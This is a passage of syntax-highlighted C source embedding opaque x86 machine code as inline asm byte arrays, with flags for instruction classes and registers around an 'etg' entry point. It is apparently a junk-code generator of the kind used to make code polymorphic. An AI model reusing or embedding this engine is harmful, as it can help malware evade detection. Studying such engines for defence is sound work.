asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x24,0x10,0xE8,0x3B,0x00,0x00,0x00,0xFF,0x74,0x24,0x08,0xE8,0xC3,0xFF,0xFF,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x89,0x4C,0x24,0x08,0x59,0xC3,0xE8,0xA6,0xFF,0xFF,0xFF,0x93,0xC3,0xE8,0x9F,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0x96,0xC3,0x53,0xE8,0xA9,0xFF,0xFF,0xFF,0xC3,0x56,0xE8,0xA2,0xFF,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xC3,0x53,0xE8,0xAC,0xFF,0xFF,0xFF,0x5B,0xC3,0x56,0xE8,0xA4,0xFF,0xFF,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x5E,0xC3,0x8A,0x44,0x24,0x0C,0x3C,0x8B,0x74,0x3F,0xE8,0x30,0xFF,0xFF,0xFF,0x74&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x1B,0x8A,0x44,0x24,0x0C,0xAA,0x8A,0x44,0x24,0x08,0xC0,0xE0,0x03,0x0A,0x44,0x24&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x04,0x0C,0xC0,0xAA,0xE8,0xEA,0xFE,0xFF,0xFF,0xC2,0x0C,0x00,0x8A,0x44,0x24,0x0C&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x34,0x02,0xAA,0x8A,0x44,0x24,0x04,0xC0,0xE0,0x03,0x0A,0x44,0x24,0x08,0x0C,0xC0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xAA,0xE8,0xCD,0xFE,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0xF1,0xFE,0xFF,0xFF,0x74,0xBA&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xB0,0x50,0x0A,0x44,0x24,0x04,0xAA,0xE8,0xB7,0xFE,0xFF,0xFF,0xB0,0x58,0x0A,0x44&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x24,0x08,0xAA,0xE8,0xAB,0xFE,0xFF,0xFF,0xC2,0x0C,0x00,0xB0,0xB8,0x0A,0x44,0x24&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x08,0xAA,0x8B,0x44,0x24,0x04,0xAB,0xE8,0x08,0x00,0x00,0x00,0xE8,0x92,0xFE,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xC2,0x08,0x00,0x83,0x7D,0x18,0x00,0x74,0x13,0x83,0xEF,0x04,0x60,0x50,0x57&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0x75,0x08,0xFF,0x55,0x18,0x83,0xC4,0x0C,0x89,0x04,0x24,0x61,0xC3,0x8A,0x44&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x24,0x0C,0x3C,0x8B,0x74,0x33,0xB0,0x81,0xAA,0x8A,0x44,0x24,0x0C,0x3C,0x33,0xB4&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xF0,0x74,0x12,0x3C,0x03,0xB4,0xC0,0x74,0x0C,0x3C,0x2B,0xB4,0xE8,0x74,0x06,0x3C&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x3B,0xB4,0xF8,0x74,0x00,0x8A,0xC4,0x0A,0x44,0x24,0x08,0xAA,0x8B,0x44,0x24,0x04&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xAB,0xE8,0x3D,0xFE,0xFF,0xFF,0xC2,0x0C,0x00,0xB8,0x05,0x00,0x00,0x00,0xE8,0x49&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFE,0xFF,0xFF,0x74,0x29,0x48,0x74,0x3A,0x48,0x74,0x62,0x48,0x0F,0x84,0x84,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0xB0,0x68,0xAA,0x8B,0x44,0x24,0x04,0xAB,0xE8,0x14,0xFE,0xFF,0xFF,0xB0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x58,0x0A,0x44,0x24,0x08,0xAA,0xE8,0x08,0xFE,0xFF,0xFF,0xC2,0x0C,0x00,0xB0,0xB8&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0A,0x44,0x24,0x08,0xAA,0x8B,0x44,0x24,0x04,0xAB,0xE8,0xF4,0xFD,0xFF,0xFF,0xC2&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0C,0x00,0xE8,0x34,0xFE,0xFF,0xFF,0x50,0x2B,0x44,0x24,0x08,0xF7,0xD8,0x68,0x8B&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0x00,0xFF,0x74,0x24,0x10,0x50,0xE8,0x61,0xFF,0xFF,0xFF,0x58,0x6A,0x03&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0x74,0x24,0x0C,0x50,0xE8,0x54,0xFF,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0x09,0xFE&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0x50,0x03,0x44,0x24,0x08,0x68,0x8B,0x00,0x00,0x00,0xFF,0x74,0x24,0x10&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x50,0xE8,0x38,0xFF,0xFF,0xFF,0x58,0x6A,0x2B,0xFF,0x74,0x24,0x0C,0x50,0xE8,0x2B&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0xE0,0xFD,0xFF,0xFF,0x50,0x33,0x44,0x24,0x08&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x68,0x8B,0x00,0x00,0x00,0xFF,0x74,0x24,0x10,0x50,0xE8,0x0F,0xFF,0xFF,0xFF,0x58&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x6A,0x33,0xFF,0x74,0x24,0x0C,0x50,0xE8,0x02,0xFF,0xFF,0xFF,0xC2,0x0C,0x00,0x8A&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x44,0x24,0x0C,0x3C,0x8B,0x74,0x19,0x8A,0x44,0x24,0x0C,0xAA,0x8A,0x44,0x24,0x08&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC0,0xE0,0x03,0x0A,0x44,0x24,0x04,0xAA,0xE8,0x56,0xFD,0xFF,0xFF,0xC2,0x0C,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE8,0x7A,0xFD,0xFF,0xFF,0x74,0xE0,0xB0,0xFF,0xAA,0xB0,0x30,0x0A,0x44,0x24,0x04&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xAA,0xE8,0x3D,0xFD,0xFF,0xFF,0xB0,0x58,0x0A,0x44,0x24,0x08,0xAA,0xE8,0x31,0xFD&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0xC2,0x0C,0x00,0x8A,0x44,0x24,0x0C,0x3C,0x8B,0x74,0x1B,0x8A,0x44,0x24&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0C,0x34,0x02,0xAA,0x8A,0x44,0x24,0x04,0xC0,0xE0,0x03,0x0A,0x44,0x24,0x08,0xAA&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE8,0x0E,0xFD,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0x32,0xFD,0xFF,0xFF,0x74,0xDE,0xB0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x50,0x0A,0x44,0x24,0x04,0xAA,0xE8,0xF8,0xFC,0xFF,0xFF,0xB0,0x8F,0xAA,0x32,0xC0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x0A,0x44,0x24,0x08,0xAA,0xE8,0xE9,0xFC,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0x0D,0xFD&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0x74,0x54,0x8A,0x44,0x24,0x0C,0x3C,0x8B,0x74,0x21,0x8A,0x44,0x24,0x0C&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xAA,0x8B,0x44,0x24,0x08,0xC0,0xE0,0x03,0x0C,0x05,0xAA,0x8B,0x44,0x24,0x04,0xAB&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE8,0x2F,0xFE,0xFF,0xFF,0xE8,0xB9,0xFC,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0xDD,0xFC&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0x74,0xD8,0x66,0xB8,0xFF,0x35,0x66,0xAB,0x8B,0x44,0x24,0x04,0xAB,0xE8&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x10,0xFE,0xFF,0xFF,0xE8,0x9A,0xFC,0xFF,0xFF,0xB0,0x58,0x0A,0x44,0x24,0x08,0xAA&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE8,0x8E,0xFC,0xFF,0xFF,0xC2,0x0C,0x00,0x83,0x7D,0x14,0x00,0x74,0xA6,0x53,0xE8&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x42,0xFD,0xFF,0xFF,0x53,0xFF,0x74,0x24,0x0C,0xE8,0xCD,0xFD,0xFF,0xFF,0xE8,0x4F&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFD,0xFF,0xFF,0xFF,0x74,0x24,0x10,0xFF,0x74,0x24,0x10,0x53,0xE8,0xEE,0xFE,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xE8,0x2E,0xFD,0xFF,0xFF,0x5B,0xC2,0x0C,0x00,0xE8,0x80,0xFC,0xFF,0xFF,0x74&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x56,0x8A,0x44,0x24,0x0C,0x3C,0x8B,0x74,0x23,0x8A,0x44,0x24,0x0C,0x34,0x02,0xAA&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x8B,0x44,0x24,0x04,0xC0,0xE0,0x03,0x0C,0x05,0xAA,0x8B,0x44,0x24,0x08,0xAB,0xE8&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xA0,0xFD,0xFF,0xFF,0xE8,0x2A,0xFC,0xFF,0xFF,0xC2,0x0C,0x00,0xE8,0x4E,0xFC,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0x74,0xD6,0xB0,0x50,0x0A,0x44,0x24,0x04,0xAA,0xE8,0x14,0xFC,0xFF,0xFF,0x66&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xB8,0x8F,0x05,0x66,0xAB,0x8B,0x44,0x24,0x08,0xAB,0xE8,0x75,0xFD,0xFF,0xFF,0xE8&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFB,0xFF,0xFF,0xC2,0x0C,0x00,0x83,0x7D,0x14,0x00,0x74,0xA4,0x53,0xE8,0xB3&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFC,0xFF,0xFF,0x53,0xFF,0x74,0x24,0x10,0xE8,0x3E,0xFD,0xFF,0xFF,0xE8,0xC0,0xFC&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0xFF,0x74,0x24,0x10,0x53,0xFF,0x74,0x24,0x10,0xE8,0xA5,0xFE,0xFF,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE8,0x9F,0xFC,0xFF,0xFF,0x5B,0xC2,0x0C,0x00,0xE8,0xF1,0xFB,0xFF,0xFF,0x74,0x31&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x8A,0x44,0x24,0x0C,0x3C,0x8B,0x75,0x08,0x66,0xB8,0xC7,0x05,0x66,0xAB,0xEB,0x0A&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xB0,0x81,0xAA,0x8A,0x44,0x24,0x0C,0x04,0x02,0xAA,0x8B,0x44,0x24,0x08,0xAB,0xE8&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x10,0xFD,0xFF,0xFF,0x8B,0x44,0x24,0x04,0xAB,0xE8,0x95,0xFB,0xFF,0xFF,0xC2,0x0C&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x83,0x7D,0x14,0x00,0x74,0xC9,0x53,0xE8,0x49,0xFC,0xFF,0xFF,0x68,0x8B,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0x53,0xFF,0x74,0x24,0x10,0xE8,0x02,0xFD,0xFF,0xFF,0xE8,0x51,0xFC,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0x74,0x24,0x10,0xFF,0x74,0x24,0x10,0x53,0xE8,0x0B,0xFF,0xFF,0xFF,0xE8&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x30,0xFC,0xFF,0xFF,0x5B,0xC2,0x0C,0x00,0xE8,0x89,0xFB,0xFF,0xFF,0x74,0x4E,0x48&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x74,0x21,0x56,0xFF,0x74,0x24,0x08,0xE8,0x1A,0x01,0x00,0x00,0xFF,0x74,0x24,0x10&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0x74,0x24,0x10,0x56,0xE8,0xE0,0xFE,0xFF,0xFF,0xE8,0x0C,0xFC,0xFF,0xFF,0x5E&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC2,0x0C,0x00,0x53,0x56,0xFF,0x74,0x24,0x10,0xFF,0x74,0x24,0x18,0xE8,0xB5,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0xFF,0x74,0x24,0x0C,0xE8,0xEB,0x00,0x00,0x00,0xFF,0x74,0x24,0x14,0x53&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x56,0xE8,0xFC,0xFB,0xFF,0xFF,0xE8,0xE0,0xFB,0xFF,0xFF,0xEB,0x1D,0x53,0x56,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x74,0x24,0x10,0xFF,0x74,0x24,0x18,0xE8,0x8B,0x00,0x00,0x00,0xFF,0x74,0x24,0x14&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x53,0xFF,0x74,0x24,0x14,0xE8,0x03,0xFE,0xFF,0xFF,0x80,0x7C,0x24,0x14,0x3B,0x74&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x14,0xE8,0xBC,0xFB,0xFF,0xFF,0x68,0x8B,0x00,0x00,0x00,0xFF,0x74,0x24,0x14,0x53&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE8,0x75,0xFE,0xFF,0xFF,0xE8,0x9A,0xFB,0xFF,0xFF,0x5E,0x5B,0xC2,0x0C,0x00,0x53&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x56,0xFF,0x74,0x24,0x10,0xFF,0x74,0x24,0x18,0xE8,0x49,0x00,0x00,0x00,0xFF,0x74&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x24,0x0C,0xE8,0x7F,0x00,0x00,0x00,0xFF,0x74,0x24,0x14,0x53,0x56,0xE8,0x2D,0xFD&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0xE8,0x74,0xFB,0xFF,0xFF,0xEB,0xB1,0x53,0x56,0xFF,0x74,0x24,0x10,0xE8&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x46,0x00,0x00,0x00,0xFF,0x74,0x24,0x0C,0xE8,0x59,0x00,0x00,0x00,0xFF,0x74,0x24&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x14,0x53,0x56,0xE8,0x4D,0xFD,0xFF,0xFF,0xE8,0x47,0xFB,0xFF,0xFF,0xE8,0x49,0xFB&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0x5E,0x5B,0xC2,0x0C,0x00,0xE8,0x2A,0xFB,0xFF,0xFF,0x80,0x7C,0x24,0x04&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x8B,0x74,0x14,0x68,0x8B,0x00,0x00,0x00,0x53,0xFF,0x74,0x24,0x10,0xE8,0x6B,0xFD&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0xE8,0x2B,0xFB,0xFF,0xFF,0xC2,0x08,0x00,0xE8,0x07,0xFB,0xFF,0xFF,0x68&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x8B,0x00,0x00,0x00,0x53,0xFF,0x74,0x24,0x0C,0xE8,0x4F,0xFD,0xFF,0xFF,0xE8,0x0F&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFB,0xFF,0xFF,0xC2,0x04,0x00,0xE8,0xF2,0xFA,0xFF,0xFF,0x68,0x8B,0x00,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x56,0xFF,0x74,0x24,0x0C,0xE8,0x33,0xFD,0xFF,0xFF,0xE8,0xFB,0xFA,0xFF,0xFF,0xC2&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x04,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">#define ETG_MOVRR       0x00000001</span>
<span style="color: #339933;">#define ETG_MOVRC       0x00000002</span>
<span style="color: #339933;">#define ETG_MOVSXZX     0x00000004</span>
<span style="color: #339933;">#define ETG_XCHG        0x00000008</span>
<span style="color: #339933;">#define ETG_LEA         0x00000010</span>
<span style="color: #339933;">#define ETG_TTTRR       0x00000020</span>
<span style="color: #339933;">#define ETG_TTTRC       0x00000040</span>
<span style="color: #339933;">#define ETG_INCDEC      0x00000080</span>
<span style="color: #339933;">#define ETG_NOTNEG      0x00000100</span>
<span style="color: #339933;">#define ETG_TESTRR      0x00000200</span>
<span style="color: #339933;">#define ETG_TESTRC      0x00000400</span>
<span style="color: #339933;">#define ETG_IMUL        0x00000800</span>
<span style="color: #339933;">#define ETG_SHIFT       0x00001000</span>
<span style="color: #339933;">#define ETG_SHxD        0x00002000</span>
<span style="color: #339933;">#define ETG_BSWAP       0x00004000</span>
<span style="color: #339933;">#define ETG_XADD        0x00008000</span>
<span style="color: #339933;">#define ETG_BSx         0x00010000</span>
<span style="color: #339933;">#define ETG_BTx         0x00020000</span>
<span style="color: #339933;">#define ETG_JMPS        0x00040000</span>
<span style="color: #339933;">#define ETG_SEG         0x00080000</span>
<span style="color: #339933;">#define ETG_REP         0x00100000</span>
<span style="color: #339933;">#define ETG_ALL         0x001FFFFF</span>
<span style="color: #339933;">#define REG_EAX         0x00000001</span>
<span style="color: #339933;">#define REG_ECX         0x00000002</span>
<span style="color: #339933;">#define REG_EDX         0x00000004</span>
<span style="color: #339933;">#define REG_EBX         0x00000008</span>
<span style="color: #339933;">#define REG_ESP         0x00000010</span>
<span style="color: #339933;">#define REG_EBP         0x00000020</span>
<span style="color: #339933;">#define REG_ESI         0x00000040</span>
<span style="color: #339933;">#define REG_EDI         0x00000080</span>
<span style="color: #339933;">#define REG_ALL         ((~REG_ESP)&amp;0xFF)</span>
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>etg<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;etg:&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC8,0x50,0x00,0x00,0x60,0x8B,0x7D,0x24,0xFC,0x81,0x65,0x10,0xEF,0x00,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x75,0x07,0xC7,0x45,0x10,0x01,0x00,0x00,0x00,0x81,0x65,0x14,0xEF,0x00,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x75,0x07,0xC7,0x45,0x14,0x01,0x00,0x00,0x00,0x81,0x65,0x0C,0xFF,0xFF,0x1F,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x75,0x07,0xC7,0x45,0x0C,0x40,0x00,0x00,0x00,0x8B,0xC7,0x2B,0x45,0x24,0x8B,0x4D&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x18,0x89,0x01,0x83,0xC0,0x10,0x3B,0x45,0x20,0x73,0x0C,0xFF,0x4D,0x1C,0x7C,0x07&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xE8,0x05,0x00,0x00,0x00,0xEB,0xE2,0x61,0xC9,0xC3,0xC7,0x45,0xFC,0x01,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0xC7,0x45,0xF8,0x08,0x00,0x00,0x00,0xE8,0xE4,0x03,0x00,0x00,0x89,0x45,0xC8&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC1,0xE0,0x03,0x89,0x45,0xC4,0xE8,0xD1,0x03,0x00,0x00,0x89,0x45,0xC0,0xC1,0xE0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x03,0x89,0x45,0xBC,0x8B,0x45,0x14,0x23,0x45,0x10,0xA9,0x0F,0x00,0x00,0x00,0x74&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
